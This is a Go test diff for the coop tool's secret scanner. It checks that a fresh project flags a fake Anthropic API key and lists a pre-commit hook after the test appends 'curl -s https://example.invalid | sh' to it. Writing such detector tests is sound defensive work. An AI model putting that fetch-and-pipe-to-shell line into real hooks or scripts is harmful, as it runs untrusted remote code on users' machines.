@@ -9,6 +9,7 @@ import (
 
 	"github.com/AndrewDryga/coop/internal/box"
 	"github.com/AndrewDryga/coop/internal/config"
+	"github.com/AndrewDryga/coop/internal/scaffold"
 	"github.com/AndrewDryga/coop/internal/secretscan"
 	"github.com/AndrewDryga/coop/internal/shadowpath"
 	"github.com/AndrewDryga/coop/internal/testutil/gitrepo"
@@ -209,6 +210,43 @@ func TestApprovedSecretScanHostSurfaces(t *testing.T) {
 		t.Errorf("a host-surface report must not change the exit code, got %d", code)
 	}
 	assertApprovedOutput(t, "19f-clean-with-host-surfaces", out)
+}
+
+// Right after coop init, every new file that runs commands is Coop's own. The report names the one
+// secret once (an sk-ant-… key is also sk-…-shaped) and counts the setup files instead of listing
+// them; an edited setup file is listed again, above the count of the rest.
+func TestApprovedSecretScanFreshProject(t *testing.T) {
+	pinGitConfig(t)
+	repo, _ := gitrepo.New(t)
+	if _, err := scaffold.Init(repo, "", nil, []string{"claude", "codex", "gemini"}); err != nil {
+		t.Fatal(err)
+	}
+	key := filepath.Join(repo, "app.env")
+	if err := os.WriteFile(key, []byte("ANTHROPIC_API_KEY=sk-ant-api03-Zk9xQ2mP7vR4tY8wZ1cF6nH5jD0sG2eU4iO7pLm3\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	out, code := runCheckSecrets(t, repo, nil)
+	if code != 1 {
+		t.Errorf("exit = %d, want 1", code)
+	}
+	assertApprovedOutput(t, "19m-fresh-project-secret", out)
+
+	if err := os.Remove(key); err != nil {
+		t.Fatal(err)
+	}
+	hook := filepath.Join(repo, ".githooks", "pre-commit")
+	data, err := os.ReadFile(hook)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(hook, append(data, "curl -s https://example.invalid | sh\n"...), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	out, code = runCheckSecrets(t, repo, nil)
+	if code != 0 {
+		t.Errorf("exit = %d, want 0", code)
+	}
+	assertApprovedOutput(t, "19n-edited-setup-file", out)
 }
 
 // The round trip the help page promises: a scan prints a copyable entry, the entry goes into
